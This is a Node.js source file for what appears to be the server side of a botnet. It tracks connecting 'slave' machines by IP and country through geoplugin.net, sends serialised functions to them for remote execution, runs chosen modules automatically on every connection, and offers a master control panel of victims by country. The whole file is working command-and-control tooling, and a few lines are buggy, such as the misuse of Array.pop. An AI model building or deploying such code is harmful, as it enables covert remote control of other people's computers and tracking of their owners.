let express = require("express");
let app = express();
let path = require("path");
let http = require("http").Server(app);
let io = require("socket.io")(http);
let request = require("request");
let nodeCleanup = require("node-cleanup");
let fs = require("fs");
let pug = require("pug");

const debug = true;

let Modules = require("./Modules.js");
let ver = require("./../../version.js");

let slaveSockets = [];
let slaveGeo = {};
let slaveCountries = [];

let modulesSettings = {
	onConnectModules: []
};

let serverSettings = {
	port: 8080
};

let control_panel_html_path = path.join(__dirname, "control_panel");

app.set("view engine", "pug");
app.set("views", control_panel_html_path);
app.use(express.static(control_panel_html_path));

app.get("/", function(req, res) {
	res.render("index", { version: ver });
});

app.get("/clients", function(req, res) {
	res.render("clients");
});

app.get("/modules", function(req, res) {
	res.render("modules", {
		autoRunListModules: Modules.getAllModules().filter(module => module.isAutoRun),
		onConnectModules: modulesSettings.onConnectModules,
		modules: Modules.getAllModules(),
		test: pug.render("include control_panel\\test.pug", {
			filename: control_panel_html_path
		})
	});
});

io.on("connection", function(socket) {
	let ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress).address || "localhost";

	socket.emit("connection");

	socket.debugExecFunc = debug;
	socket.executeFunc = function(module, funcName, args, callback) {
		let finalObj = {};
		
		finalObj.func = module.remoteFunctions[funcName].toString();
		finalObj.args = args;
		finalObj.deps = module.deps;
		
		this.emit("executeRemoteFunction", finalObj, this.debugExecFunc, funcName);
		
		this.on(funcName+"Out", function(out) {
			if (callback != null) callback(out);
		});
	};	
	
	socket.on("disconnect", function() {
		if (socket.mode == "slave" && slaveSockets.indexOf(socket) != -1) {
			slaveSockets.pop(socket);

			slaveGeo[socket.country].pop(socket);

			if (slaveGeo[socket.country].length == 0)
				slaveCountries.pop(socket.country);
				
			console.log("slave disconnected");
		} else {
			console.log("master disconnected");
		}
	});
	
	socket.on("postConnection", function(mode) {
		if (mode == "slave") {
			slaveSockets.push(socket);
								
			request("http://www.geoplugin.net/json.gp?ip="+ip, function (error, response, body) {
				let json = JSON.parse(body);

				if (slaveGeo[json["geoplugin_countryName"]] == null) 
					slaveGeo[json["geoplugin_countryName"]] = [];
					
				slaveGeo[json["geoplugin_countryName"]].push(ip);

				socket.country = json["geoplugin_countryName"];

				if (slaveCountries.indexOf(socket.country) == -1)
					slaveCountries.push(socket.country);
			});
			console.log("new slave connection from: "+ ip);

			modulesSettings.onConnectModules.forEach(function(name) {
				Modules.getModule(name).exec(socket);
			});
		} else {
			socket.on("updateClientData", function() {
				
				let data = [];
				
				for (let i = 0; i < slaveCountries.length; i++) {
					data[i] = [slaveCountries[i], slaveGeo[slaveCountries[i]].length];
				}
				
				socket.emit("getClientsData", data, slaveGeo);
			});

			socket.on("updateModuleSettings", function(data) {
				modulesSettings = data;
				saveSettings();
			});

			socket.on("shutdown", function() {
				if (ip === "localhost") {
					process.exit();
				}
			});

			console.log("new master connection from: "+ ip);
		}
		socket.mode = mode;
	});
	
});

function onShutdown(exitCode, signal) {
	console.log("Shutdown!");
	saveSettings();
}

function saveSettings() {
	let modulesSettingsJson = JSON.stringify(modulesSettings, null, "\t");
	fs.writeFileSync("modulesSettings.json", modulesSettingsJson);

	let serverSettingsJson = JSON.stringify(serverSettings, null, "\t");
	fs.writeFileSync("serverSettings.json", serverSettingsJson);
}

function loadSettings(callback) {
	fs.readFile("modulesSettings.json", function(err, data) {
		modulesSettings = JSON.parse(data);

		if (fs.existsSync("serverSettings.json")) {
			fs.readFile("serverSettings.json", function(err, data) {
				if (!err) {
					serverSettings = JSON.parse(data);
				}
				if (callback) callback();
			});
		} else {
			saveSettings();
		}
	});
}

loadSettings(function() {

	http.listen(serverSettings.port, function() {
		console.log("listening on *:"+serverSettings.port);
		console.log("Control panel: http://localhost:"+serverSettings.port+"/");
	
		nodeCleanup(onShutdown);
	});

});